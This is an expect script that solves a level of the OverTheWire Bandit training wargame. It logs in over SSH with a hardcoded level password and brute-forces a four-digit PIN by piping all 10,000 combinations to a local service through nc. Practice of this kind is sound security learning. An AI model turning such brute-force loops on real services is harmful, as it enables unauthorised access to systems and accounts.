#!/usr/bin/expect -f

spawn ssh -p 2220 bandit24@bandit.labs.overthewire.org
expect "*: "
send "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ\r"
expect "*\$ "

set timeout 30

send "for i in \$(seq -f \"%04g\" 0 9999); do echo \"UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ \$i\"; done | nc localhost 30002 | uniq;\r"
expect "*\$ "

send "exit\r"